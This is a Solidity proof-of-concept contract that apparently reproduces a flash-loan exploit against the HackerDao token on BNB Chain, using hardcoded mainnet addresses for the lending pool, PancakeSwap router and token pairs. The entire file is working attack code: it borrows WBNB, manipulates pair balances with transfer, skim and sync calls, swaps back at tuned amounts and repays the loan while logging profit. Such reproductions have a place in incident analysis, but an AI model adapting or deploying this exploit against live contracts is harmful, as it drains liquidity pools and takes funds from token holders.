// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


import "./IERC20.sol";
import "./console.sol";
import "./IUniswapV2pair.sol";

interface IDDPA_flashloan{
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
}


contract HackerDao_Poc{

    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public constant DPPAdvanced = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;               //flashloan wbnb and busd
    address public constant hackerdao_token = 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C;
    address public constant pancake_router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant hackerdao_wbnb = 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2;
    address public constant hackerdao_usdt = 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225;


    uint256 Borrow_money_WBNB = 2500 * 10 ** 18;
    uint256 Borrow_money_BUSD = 0 * 10 ** 18;





    function flashloan_from_DDAP() public {
        (uint256 v0, uint256 v1) = IDDPA_flashloan(DPPAdvanced).getVaultReserve();
        console.log("ddap flash loan start...baseAmount , quoteAmount : ", v0, v1);

        bytes memory _data = "ddap flash loan start...";
        uint256 baseAmount = Borrow_money_WBNB;
        uint256 quoteAmount = Borrow_money_BUSD;
        IDDPA_flashloan(DPPAdvanced).flashLoan(baseAmount, quoteAmount, address(this), _data);

        console.log("8xxxxxx after exploit I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));
    }


    function DPPFlashLoanCall(address sender,uint256 baseAmount,uint256 quoteAmount,bytes calldata data) external {
        console.log("1xxxxx now I have WBNB: ", IERC20(WBNB).balanceOf(address(this)));

        IERC20(hackerdao_token).approve(pancake_router, type(uint).max);
        IERC20(WBNB).approve(pancake_router, type(uint).max);

        console.log("hackerdao_wbnb has hackerdao tokens: ", IERC20(hackerdao_token).balanceOf(hackerdao_wbnb));

        (uint256 r0, uint256 r1, ) = UniswapV2Pair(hackerdao_wbnb).getReserves();
        console.log("hackerdao_wbnb reserve: ", r0, r1);


        uint256 amountOut = 10315400487514994955409;
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = hackerdao_token;
        uint[] memory return_amount = UniswapV2Pair(pancake_router).getAmountsIn(amountOut, path);
        console.log("2xxxxxx getAmountsIn amount return: ", return_amount[0], return_amount[1]);


        uint amountIn0 = 1994917166344848861696;
        uint amountOutMin0 = 0;
        // address[] memory path1 = new address[](2);
        UniswapV2Pair(pancake_router).swapExactTokensForTokens(amountIn0, amountOutMin0, path, address(this), block.timestamp);

        uint256 balance_hackerdao = IERC20(hackerdao_token).balanceOf(address(this));
        console.log("3xxxxxx my hackerdao balance is: ", balance_hackerdao);

        IERC20(hackerdao_token).transfer(hackerdao_wbnb, balance_hackerdao);
        
        UniswapV2Pair(hackerdao_wbnb).skim(hackerdao_usdt);
        UniswapV2Pair(hackerdao_usdt).skim(address(this));
        UniswapV2Pair(hackerdao_wbnb).sync();
        console.log("4xxxxxx skim and sync...my hackerdao balance is: ", IERC20(hackerdao_token).balanceOf(address(this)));

        uint amountIn1 = 7029656601027818642253;
        uint amountOutMin1 = 0;
        address[] memory path1 = new address[](2);
        path1[0] = hackerdao_token;
        path1[1] = WBNB;
        UniswapV2Pair(pancake_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn1, amountOutMin1, path1, address(this), block.timestamp);
        console.log("5xxxxxx swapExactTokensForTokensSupportingFeeOnTransferTokens...");
        console.log("5xxxxxx WBNB balance is: ", IERC20(WBNB).balanceOf(address(this)));


        uint amountIn2 = 30000000000000000;
        uint amountOutMin2 = 0;
        address[] memory path2 = new address[](2);
        path2[0] = WBNB;
        path2[1] = hackerdao_token;
        uint[] memory amount_return0 = UniswapV2Pair(pancake_router).swapExactTokensForTokens(amountIn2, amountOutMin2, path2, address(this), block.timestamp);
        console.log("6xxxxxx swapExactTokensForTokens amount_return : ", amount_return0[0], amount_return0[1]);
        console.log("6xxxxxx my hackerdao balance is: ", IERC20(hackerdao_token).balanceOf(address(this)));


        uint amountIn3 = 6748413201184401921;
        uint amountOutMin3 = 0;
        address[] memory path3 = new address[](3);
        path3[0] = hackerdao_token;
        path3[1] = USDT;
        path3[2] = WBNB;
        uint[] memory amount_return1 = UniswapV2Pair(pancake_router).swapExactTokensForTokens(amountIn3, amountOutMin3, path3, address(this), block.timestamp);
        console.log("7xxxxxx swapExactTokensForTokens amount_return : ", amount_return1[0], amount_return1[1], amount_return1[2]);


        IERC20(WBNB).transfer(DPPAdvanced, Borrow_money_WBNB);

    }


}